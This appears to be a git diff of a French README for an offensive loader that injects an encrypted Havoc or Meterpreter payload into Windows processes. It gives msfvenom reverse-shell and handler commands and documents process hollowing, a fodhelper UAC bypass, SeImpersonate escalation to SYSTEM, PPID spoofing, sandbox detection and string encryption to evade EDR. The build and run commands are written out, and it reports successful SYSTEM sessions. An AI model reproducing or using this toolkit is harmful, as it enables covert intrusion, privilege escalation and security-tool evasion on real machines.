@@ -1,6 +1,159 @@
 # AES Loader - Havoc Agent Injector
 
+# AES Loader - Havoc Agent Injector
+
 Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des processus Windows via **process hollowing**, **injection directe**, ou **UAC bypass**.
+
+---
+
+## 🚀 Quick Start
+
+```bash
+# 1. Générer un payload Meterpreter
+❯ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.248 LPORT=443 -f exe -o meterpreter.x64.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 677 bytes
+Final size of exe file: 7680 bytes
+Saved as: meterpreter.x64.exe
+
+# 2. Compiler le loader avec le payload chiffré
+❯ bash builder.sh meterpreter.x64.exe x64
+[*] Encrypting payload and EDR strings...
+14 strings EDR chargées depuis edr_strings.conf
+[*] Compiling loader (x64)...
+[+] Compilation successful: loader.exe
+
+# 3. Démarrer le handler Metasploit
+❯ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.248; set LPORT 443; exploit"
+[*] Started HTTPS reverse handler on https://192.168.45.248:443
+```
+
+### 4. Exécution sur la cible (SeImpersonate + Process Hollowing)
+
+```powershell
+PS C:\Windows\Tasks> .\loader.exe -i -v -m hollow -f 'c:\windows\system32\calc.exe'
+```
+
+![Loader Execution - SeImpersonate Escalation](doc/images/loader.png)
+
+**Logs clés:**
+- ✅ Anti-analysis checks passed (virtualization, timing)
+- ✅ Named pipe created with UUID
+- ✅ RPC trigger spawned automatically (PrintSpoofer intégré)
+- ✅ SYSTEM token obtained (S-1-5-18)
+- ✅ Relaunched as SYSTEM in Session 1
+- ✅ Process hollowing de `calc.exe` (PID 1672)
+
+### 5. Session Meterpreter - NT AUTHORITY\SYSTEM
+
+![Meterpreter Session - SYSTEM](doc/images/meterpreter.png)
+
+### 6. Vérification - Task Manager
+
+![Task Manager - calc.exe Process](doc/images/processexp.png)
+
+**Propriétés du processus `calc.exe` (PID 1672):**
+- ✅ Image: Windows Calculator
+- ✅ Path: `c:\Windows\System32\calc.exe`
+- ✅ User: **NT AUTHORITY\SYSTEM**
+- ✅ Parent: `<Non-existent Process> (4012)` - Parent relaunched terminé
+
+**Résultat:** Process hollowing de `calc.exe` exécuté en **NT AUTHORITY\SYSTEM** via SeImpersonate escalation! 🔥
+
+---
+
+## 📚 Table des Matières
+
+### Documentation
+- **[Guide d'Utilisation Complet](doc/USAGE.md)** - Tous les modes d'injection, exemples, privilèges requis
+- **[Audit OPSEC des Strings](doc/EDR_STRINGS_AUDIT.md)** - Liste des 14 strings chiffrées et statut de détection
+- **[Roadmap OPSEC](doc/OPSEC_ROADMAP.md)** - Améliorations futures (syscalls, ETW, polymorphisme)
+
+### Sections du README
+- [📁 Structure du Projet](#-structure-du-projet)
+- [🔧 Builder](#-builder)
+- [📊 Milestones & Roadmap](#-milestones--roadmap)
+- [📈 Current Status](#-current-status)
+- [🎯 Fonctionnalités](#-fonctionnalités)
+- [🔒 OPSEC - Strings Chiffrées](#-opsec---strings-chiffrées)
+- [📋 Usage Rapide](#-usage-rapide)
+- [🏗️ Architecture & Flux d'Exécution](#️-architecture--flux-dexécution)
+- [👻 PPID Spoofing](#-ppid-spoofing)
+- [⚡ SeImpersonate: Escalation à SYSTEM](#-seimpersonate-escalation-à-system-via-rpc-coercion-ms-rprn)
+- [🚀 Cas d'Usage Typiques](#-cas-dusage-typiques)
+- [⚠️ Restrictions & Limitations](#️-restrictions--limitations)
+- [📦 Fichiers](#-fichiers)
+- [🔧 Compilation](#-compilation)
+- [🛡️ EDR Evasion - Strings Chiffrées](#️-edr-evasion---strings-chiffrées)
+
+---
+## � Structure du Projet
+
+```
+aes_loader/
+├── builder.sh              # Script de compilation automatisé
+├── myenc.py               # Générateur de chiffrement (14 strings EDR)
+├── edr_strings.conf       # Configuration des strings à chiffrer
+│
+├── src/                   # Sources organisées par modules
+│   ├── loader.cpp         # Point d'entrée principal
+│   ├── crypto/            # Chiffrement AES-256-CBC
+│   │   ├── easCipher42.cpp
+│   │   └── crypto_funcs.cpp
+│   ├── injection/         # Process injection techniques
+│   │   ├── process_hollower.cpp
+│   │   └── process_injection.cpp
+│   ├── bypass/            # EDR/UAC bypass
+│   │   ├── bypass_analysis.cpp
+│   │   └── uac_bypass.cpp
+│   ├── privesc/           # Escalade de privilèges
+│   │   ├── seimpersonate.cpp
+│   │   └── printspoofer_trigger.cpp
+│   └── rpc/               # RPC stubs (MIDL-generated)
+│       ├── ms-rprn_c.c
+│       └── rpc_helpers.c
+│
+├── includes/              # Headers organisés par modules
+│   ├── demon.x64.h        # (généré) 14 strings + payload chiffrés
+│   ├── crypto/
+│   ├── injection/
+│   ├── bypass/
+│   ├── privesc/
+│   └── rpc/
+│
+├── obj/                   # Fichiers objets (.o) - créé au build
+│
+└── doc/                   # Documentation
+    ├── USAGE.md           # Guide d'utilisation complet
+    ├── EDR_STRINGS_AUDIT.md  # Audit OPSEC des strings
+    └── OPSEC_ROADMAP.md   # Roadmap des améliorations
+
+```
+
+---
+
+## 🔧 Builder
+
+### Compilation
+```bash
+# Build standard
+./builder.sh demon.x64.bin
+
+# Build avec architecture spécifique
+./builder.sh demon.x64.bin x64    # Default
+./builder.sh demon.x64.bin x86    # 32-bit
+```
+
+### Nettoyage
+```bash
+# Nettoie loader.exe, includes/demon.x64.h, obj/
+./builder.sh --clean
+./builder.sh -c
+```
+
+**Sortie :** `loader.exe` (toujours le même nom)
 
 ---
 
@@ -14,12 +167,14 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 - [x] AES-256-CBC Encryption
 - [x] Anti-Analysis Checks (virtualization + timing)
 - [x] 4 Injection Modes (DEFAULT/HOLLOW/APC/UAC)
-- [x] Config-driven EDR String Encryption
+- [x] **14 EDR Strings Chiffrées** (fodhelper, registry, spoolsv, SDDL, etc.)
 - [x] Automated Builder (builder.sh)
 - [x] Meterpreter Reverse HTTPS Testing ✅ **VALIDATED**
+- [x] **Structure Modulaire** (src/, includes/, obj/)
 
 ### 🔄 Phase 2: OPSEC Enhancement (EN COURS)
 - [x] SeImpersonate Privilege Escalation (PrintSpoofer RPC intégré) ✅ **WORKING**
+- [x] **String Obfuscation Maximum** ✅ **14 strings chiffrées**
 - [ ] Polymorphic RC4 Decryption (Shoggoth-inspired)
 - [ ] Direct Syscalls (NtCreateProcess, NtWriteVirtualMemory, etc)
 - [ ] ETW Patching (EtwEventWrite + AMSI)
@@ -54,8 +209,9 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 | **UAC Bypass** | ✅ Working | 2025-12-30 |
 | **PPID Spoofing** | ✅ Working | 2025-12-30 |
 | **SeImpersonate Escalation** | ✅ Working | 2026-01-17 |
+| **14 EDR Strings Encrypted** | ✅ Verified | 2026-01-17 |
+| **Modular Structure** | ✅ Implemented | 2026-01-17 |
 | **Meterpreter Integration** | ✅ Session Live | 2025-12-30 |
-| **String Encryption** | ✅ Verified | 2025-12-30 |
 | **Direct Syscalls** | 🔄 In Development | — |
 | **Polymorphic Encryption** | 🔄 In Development | — |
 | **ETW Patching** | 🔄 In Development | — |
@@ -65,6 +221,7 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 ## 🎯 Fonctionnalités
 
 - 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes + PBKDF2
+- 🔒 **14 Strings EDR Chiffrées** : fodhelper, registry paths, spoolsv.exe, SDDL, kernel32.dll, etc.
 - 💉 **Process Hollowing** : Remplace l'image d'un processus suspendu par votre PE
 - 🪡 **APC Injection Intelligente** : Détecte automatiquement PE vs shellcode brut
 - 🛡️ **Anti-Analysis** : Vérification virtualization + timing pour détecter les sandboxes
@@ -72,6 +229,21 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 - 👻 **PPID Spoofing** : Fait croire que le processus vient d'un parent différent
 - 🚀 **UAC Bypass** : Élévation de privilèges via fodhelper
 - ⚡ **SeImpersonate Escalation** : PrintSpoofer RPC intégré pour escalade SYSTEM automatique
+- 📁 **Structure Modulaire** : Code organisé par fonctionnalité (crypto, injection, bypass, privesc)
+
+---
+
+## 🔒 OPSEC - Strings Chiffrées
+
+**14 strings sensibles entièrement chiffrées :**
+
+| Module | Strings Chiffrées | Impact |
+|--------|-------------------|--------|
+| **UAC Bypass** | fodhelper path, registry path, DelegateExecute, shell verb, svchost.exe | Signature UAC bypass invisible |
+| **Bypass Analysis** | kernel32.dll, VirtualAllocExNuma | Anti-VM checks obfusqués |
+| **SeImpersonate** | S-1-5-18, pipe paths, spoolsv.exe, WinSta0\Default, cmd.exe, SDDL | PrintSpoofer signatures masquées |
+
+**Résultat :** Aucune string détectable statiquement - OPSEC maximum 🔥
 
 ## 📋 Usage Rapide
 
@@ -461,106 +633,163 @@ Change le parent apparent d'un processus:
 
 | Fichier | Rôle |
 |---------|------|
-| `loader.cpp` | Point d'entrée, parsing args |
-| `havoc_loader.cpp` | Déchiffrement |
-| `process_hollower.cpp` | Hollowing (création + injection) |
-| `process_injection.cpp` | Injection intelligente (PE + shellcode) |
-| `crypto_funcs.cpp` | PBKDF2, hex utils |
-| `easCipher42.cpp` | AES-256-CBC |
-| `bypass_analysis.cpp` | Anti-VM + timing |
-| `uac_bypass.cpp` | Elevation via fodhelper |
-| `demon.x64.h` | Payload compilé (embedded) |
-| `myenc.py` | Script de chiffrement |
+| **src/loader.cpp** | Point d'entrée, parsing args, orchestration |
+| **src/crypto/** | |
+| ├ easCipher42.cpp | AES-256-CBC encryption/decryption |
+| └ crypto_funcs.cpp | PBKDF2, hex utils |
+| **src/injection/** | |
+| ├ process_hollower.cpp | Hollowing (création + PE injection) |
+| └ process_injection.cpp | Injection intelligente (PE + shellcode) |
+| **src/bypass/** | |
+| ├ bypass_analysis.cpp | Anti-VM + timing checks |
+| └ uac_bypass.cpp | UAC elevation via fodhelper |
+| **src/privesc/** | |
+| ├ seimpersonate.cpp | SeImpersonate escalation via RPC |
+| └ printspoofer_trigger.cpp | Print Spooler RPC coercion trigger |
+| **src/rpc/** | |
+| ├ ms-rprn_c.c | MIDL-generated MS-RPRN RPC stubs |
+| └ rpc_helpers.c | RPC binding helpers |
+| **includes/demon.x64.h** | Payload + 14 strings EDR chiffrées (généré) |
+| **myenc.py** | Script de chiffrement AES pour build |
+| **edr_strings.conf** | Configuration des 14 strings sensibles |
+| **builder.sh** | Script de compilation automatisé |
 
 ## 🔧 Compilation
 
-### Windows (MSVC)
+### Build Automatisé (Recommandé)
 ```bash
-cl /EHsc /std:c++17 /W4 ^
-  loader.cpp havoc_loader.cpp process_hollower.cpp ^
-  process_injection.cpp crypto_funcs.cpp ^
-  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp ^
-  /link kernel32.lib ntdll.lib advapi32.lib shell32.lib ole32.lib
+# Build standard (x64)
+./builder.sh demon.x64.bin
+
+# Build x86
+./builder.sh demon.x64.bin x86
+
+# Nettoyage complet
+./builder.sh --clean
 ```
 
-### Linux (MinGW)
+**Ce que builder.sh fait :**
+1. Chiffre le payload + 14 strings EDR avec `myenc.py`
+2. Génère `includes/demon.x64.h` avec les arrays chiffrés
+3. Compile tous les modules depuis `src/` vers `obj/`
+4. Cross-compile avec mingw-w64 (x64 ou x86)
+5. Link avec RPC libraries (rpcrt4, advapi32, etc.)
+6. Strip debug symbols
+7. Cleanup .o files
+
+**Output:** `loader.exe` (nom fixe)
+
+### Compilation Manuelle (Linux/MinGW)
 ```bash
-x86_64-w64-mingw32-g++ -std:c++17 -Wall -O2 \
-  loader.cpp havoc_loader.cpp process_hollower.cpp \
-  process_injection.cpp crypto_funcs.cpp \
-  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp \
-  -o loader.exe -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
+# Générer demon.x64.h d'abord
+python3 myenc.py demon.x64.bin
+
+# Compiler tous les modules
+x86_64-w64-mingw32-g++ -std=c++17 -Wall -O2 \
+  -Iincludes -Iincludes/crypto -Iincludes/injection \
+  -Iincludes/bypass -Iincludes/privesc -Iincludes/rpc \
+  src/loader.cpp \
+  src/crypto/*.cpp \
+  src/injection/*.cpp \
+  src/bypass/*.cpp \
+  src/privesc/*.cpp \
+  src/rpc/*.c \
+  -o loader.exe \
+  -lrpcrt4 -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32 -s
 ```
 
-## �️ EDR Evasion - Strings Chiffrées
+## 🛡️ EDR Evasion - Strings Chiffrées
 
-Toutes les strings sensibles sont **chiffrées en AES-256** et déchiffrées **inline au runtime**:
+**14 strings sensibles entièrement chiffrées en AES-256** et déchiffrées **inline au runtime** :
 
-### Strings Protégées
-| String | Valeur | Protection |
-|--------|--------|-----------|
-| `registry_path_enc` | `Software\Classes\ms-settings\shell\open\command` | ✅ AES-256 |
-| `delegate_execute_enc` | `DelegateExecute` | ✅ AES-256 |
-| `shell_verb_enc` | `open` | ✅ AES-256 |
-| `default_process_enc` | `C:\Windows\System32\svchost.exe` | ✅ AES-256 |
-| `fodhelper_path_enc` | `C:\Windows\System32\fodhelper.exe` | ✅ AES-256 |
+### Strings Protégées (edr_strings.conf)
+| Module | String | Valeur Originale | Protection |
+|--------|--------|------------------|-----------|
+| **UAC Bypass** | fodhelper_path | `C:\Windows\System32\fodhelper.exe` | ✅ AES-256 |
+| | registry_path | `Software\Classes\ms-settings\shell\open\command` | ✅ AES-256 |
+| | delegate_execute | `DelegateExecute` | ✅ AES-256 |
+| | shell_verb | `open` | ✅ AES-256 |
+| | default_process | `C:\Windows\System32\svchost.exe` | ✅ AES-256 |
+| **Bypass Analysis** | kernel32_dll | `kernel32.dll` | ✅ AES-256 |
+| | virtualalloc_exnuma_api | `VirtualAllocExNuma` | ✅ AES-256 |
+| **SeImpersonate** | system_sid | `S-1-5-18` | ✅ AES-256 |
+| | pipe_prefix | `\\\\.\\pipe\\` | ✅ AES-256 |
+| | pipe_suffix | `\\pipe\\spoolss` | ✅ AES-256 |
+| | spoolsv_exe | `spoolsv.exe` | ✅ AES-256 |
+| | desktop_station | `WinSta0\\Default` | ✅ AES-256 |
+| | cmd_exe | `cmd.exe` | ✅ AES-256 |
+| | sddl_everyone | `D:(A;;GA;;;WD)` | ✅ AES-256 |
 
-### Gestion
+### Gestion des Strings
 ```bash
-# Config: edr_strings.conf
-fodhelper_path:C:\Windows\System32\fodhelper.exe
-registry_path:Software\Classes\ms-settings\shell\open\command
-delegate_execute:DelegateExecute
-shell_verb:open
-default_process:C:\Windows\System32\svchost.exe
-```
+# Configuration dans edr_strings.conf (14 strings)
+cat edr_strings.conf
 
-### Vérification Anti-Détection
-```bash
-# Les strings ne doivent PAS être en clair
+# Génération automatique via builder.sh
+./builder.sh demon.x64.bin
+# → Chiffre les 14 strings → includes/demon.x64.h
+
+# Vérification anti-détection (aucune string en clair)
 strings loader.exe | grep -i "DelegateExecute"    # ✅ Vide
-strings loader.exe | grep -i "Software"           # ✅ Vide
 strings loader.exe | grep -i "ms-settings"        # ✅ Vide
+strings loader.exe | grep -i "spoolss"            # ✅ Vide
+strings loader.exe | grep -i "S-1-5-18"           # ✅ Vide
 ```
 
-## � Builder Automatisé
+**Résultat OPSEC:** Aucune signature statique détectable - 14/14 strings masquées 🔥
+
+---
+
+## 📦 Builder Automatisé
 
 ### Flux Complet (builder.sh)
 
 Le script **builder.sh** automatise l'ensemble du process:
 
 ```bash
-# Usage: ./builder.sh <payload> <output_exe> <architecture>
-./builder.sh demon.x64.exe loader.exe x64
+# Usage standard
+./builder.sh demon.x64.bin          # Build x64
+./builder.sh demon.x64.bin x86      # Build x86
 
-# Ou avec chemins complets
-./builder.sh /path/to/payload.bin ./loader.exe x64
+# Nettoyage
+./builder.sh --clean                # Supprime loader.exe, includes/demon.x64.h, obj/
 ```
 
 **Étapes exécutées automatiquement:**
 
-1. **Chiffrement du payload**
+1. **Chiffrement du payload + 14 EDR strings**
    ```
-   python3 myenc.py <payload>
-   ↓ Génère: demon.x64.h (payload_enc + strings chiffrées)
-   ```
-
-2. **Chiffrement des strings EDR** (via edr_strings.conf)
-   ```
-   edr_strings.conf → myenc.py → demon.x64.h
-   ├─ fodhelper_path
-   ├─ registry_path
-   ├─ delegate_execute
-   ├─ shell_verb
-   └─ default_process
+   python3 myenc.py demon.x64.bin
+   ↓ 
+   Génère: includes/demon.x64.h
+   - payload_enc[] + payload_enc_len
+   - 14 strings chiffrées (fodhelper_path_enc[], registry_path_enc[], etc.)
    ```
 
-3. **Compilation du loader**
+2. **Compilation modulaire**
    ```
-   g++ -std:c++17 -Wall -O2 \
-     *.cpp -o loader.exe \
-     -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
+   src/crypto/*.cpp     → obj/easCipher42.o, obj/crypto_funcs.o
+   src/injection/*.cpp  → obj/process_hollower.o, obj/process_injection.o
+   src/bypass/*.cpp     → obj/bypass_analysis.o, obj/uac_bypass.o
+   src/privesc/*.cpp    → obj/seimpersonate.o, obj/printspoofer_trigger.o
+   src/rpc/*.c          → obj/ms-rprn_c.o, obj/rpc_helpers.o
+   src/loader.cpp       → obj/loader.o
    ```
+
+3. **Linking avec RPC libraries**
+   ```
+   g++ obj/*.o -o loader.exe -lrpcrt4 -ladvapi32 -lkernel32 ...
+   ```
+
+4. **Strip + Cleanup**
+   ```
+   strip loader.exe       # Supprime debug symbols
+   rm obj/*.o            # Cleanup temporaires
+   ```
+
+**Output:** `loader.exe` (toujours le même nom, ~150KB stripped)
+
+---
 
 4. **Résultat**
    ```
